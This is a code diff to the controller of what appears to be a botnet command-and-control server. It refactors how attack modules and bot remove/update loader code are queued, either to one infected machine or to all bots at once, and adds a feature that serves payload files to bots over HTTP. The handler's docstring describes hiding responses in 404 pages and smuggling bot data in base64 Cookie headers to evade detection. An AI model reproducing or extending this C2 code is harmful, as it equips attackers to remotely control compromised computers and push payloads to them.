@@ -10,6 +10,8 @@ from textwrap import dedent
 from threading import Thread
 from time import time, strftime, localtime
 from urllib.parse import unquote_plus
+import shutil
+from os import fstat
 
 from urwid import ExitMainLoop
 
@@ -174,76 +176,60 @@ class Controller:
 
     def _run_module(self, module_name, mass_execute=False):
         """Setup then run the module, required because otherwise calls to prompt block the main thread."""
-        if module_name in ["remove_bot", "update_bot"]:
-            # Special modules which aren't in the modules directory.
+        try:
+            module = modules.get_module(module_name)
             code = ("", b"")
 
-            if mass_execute:
-                bots = self._model.get_bots()
+            if not module:
+                module = modules.load_module(module_name, self._view, self._model)
 
-                for bot in bots:
-                    if module_name == "remove_bot":
-                        if code[0] != bot.loader_name:
-                            code = (bot.loader_name, loaders.get_remove_code(bot.loader_name))
-                    elif module_name == "update_bot":
-                        if code[0] != bot.loader_name:
-                            code = (bot.loader_name, loaders.get_update_code(bot.loader_name))
+            successful, options = module.setup()
 
-                    self._model.add_command(bot.uid, Command(
-                        CommandType.MODULE, code[1]
-                    ))
-
-                self._view.output("Module added to the queue of {} bots.".format(len(bots)))
+            if not successful:
+                self._view.output("Module setup failed or cancelled.", "attention")
             else:
-                if module_name == "remove_bot":
-                    code = loaders.get_remove_code(self._connected_bot.loader_name)
-                elif module_name == "update_bot":
-                    code = loaders.get_update_code(self._connected_bot.loader_name)
+                if not options:
+                    options = {}
 
-                self._model.add_command(self._connected_bot.uid, Command(
-                    CommandType.MODULE, code
-                ))
+                options["module_name"] = module_name
 
-                self._view.output("Module added to the queue of \"{}@{}\".".format(
-                    self._connected_bot.username, self._connected_bot.hostname
-                ), "info")
-        else:
-            try:
-                module = modules.get_module(module_name)
+                if mass_execute:
+                    bots = self._model.get_bots()
 
-                if not module:
-                    module = modules.load_module(module_name, self._view, self._model)
+                    for bot in bots:
+                        if module_name == "remove_bot":
+                            if code[0] != bot.loader_name:
+                                code = (bot.loader_name, loaders.get_remove_code(bot.loader_name))
+                        elif module_name == "update_bot":
+                            if code[0] != bot.loader_name:
+                                code = (bot.loader_name, loaders.get_update_code(bot.loader_name))
+                        else:
+                            if not code[0]:
+                                code = modules.get_code(module_name)
 
-                successful, options = module.setup()
-
-                if not successful:
-                    self._view.output("Module setup failed or cancelled.", "attention")
-                else:
-                    if not options:
-                        options = {}
-                    options["module_name"] = module_name
-
-                    if mass_execute:
-                        bots = self._model.get_bots()
-                        code = modules.get_code(module_name)
-
-                        for bot in bots:
-                            self._model.add_command(bot.uid, Command(
-                                CommandType.MODULE, code, options
-                            ))
-
-                        self._view.output("Module added to the queue of {} bots.".format(len(bots)))
-                    else:
-                        self._model.add_command(self._connected_bot.uid, Command(
-                            CommandType.MODULE, modules.get_code(module_name), options
+                        self._model.add_command(bot.uid, Command(
+                            CommandType.MODULE, code[1], options
                         ))
 
-                        self._view.output("Module added to the queue of \"{}@{}\".".format(
-                            self._connected_bot.username, self._connected_bot.hostname
-                        ), "info")
-            except ImportError:
-                self._view.output("Failed to find module: {}".format(module_name), "attention")
-                self._view.output("Type \"modules\" to get a list of available modules.", "attention")
+                    self._view.output("Module added to the queue of {} bots.".format(len(bots)))
+                else:
+                    if module_name == "remove_bot":
+                        code = loaders.get_remove_code(self._connected_bot.loader_name)
+                    elif module_name == "update_bot":
+                        code = loaders.get_update_code(self._connected_bot.loader_name)
+                    else:
+                        code = modules.get_code(module_name)
+
+                    self._model.add_command(self._connected_bot.uid, Command(
+                        CommandType.MODULE, code, options
+                    ))
+
+                    self._view.output("Module added to the queue of \"{}@{}\".".format(
+                        self._connected_bot.username, self._connected_bot.hostname
+                    ), "info")
+        except ImportError:
+            self._view.output("Failed to find module: {}".format(module_name), "attention")
+            self._view.output("Type \"modules\" to get a list of available modules.", "attention")
 
 
 class BotController(BaseHTTPRequestHandler):
@@ -252,6 +238,7 @@ class BotController(BaseHTTPRequestHandler):
     - Responses are hidden in 404 error pages (the DEBUG part)
     - GET requests are used to retrieve the current command
     - Information about the bot along with the request type is sent (base64 encoded) in the Cookie header
+    - Handles hosting files specified in the model
     """
     _model = None
     _view = None
@@ -307,7 +294,23 @@ class BotController(BaseHTTPRequestHandler):
         cookie = self.headers.get("Cookie")
 
         if not cookie:
-            self._send_command()
+            for upload_file in self._model.get_upload_files():
+                url_path, local_path = upload_file
+
+                if self.path == ("/" + url_path):
+                    with open(local_path, "rb") as input_file:
+                        fs = fstat(input_file.fileno())
+
+                        self.send_response(200)
+                        self.send_header("Content-Type", "application/octet-stream")
+                        self.send_header("Content-Disposition", 'attachment; filename="{}"'.format(url_path))
+                        self.send_header("Content-Length", str(fs.st_size))
+                        self.end_headers()
+
+                        shutil.copyfileobj(input_file, self.wfile)
+                    break
+            else:
+                self._send_command()
         else:
             # Cookie header format: session=<b64_bot_uid>-<b64_JSON_data>
             bot_uid = b64decode(cookie.split("-")[0].replace("session=", "").encode()).decode()
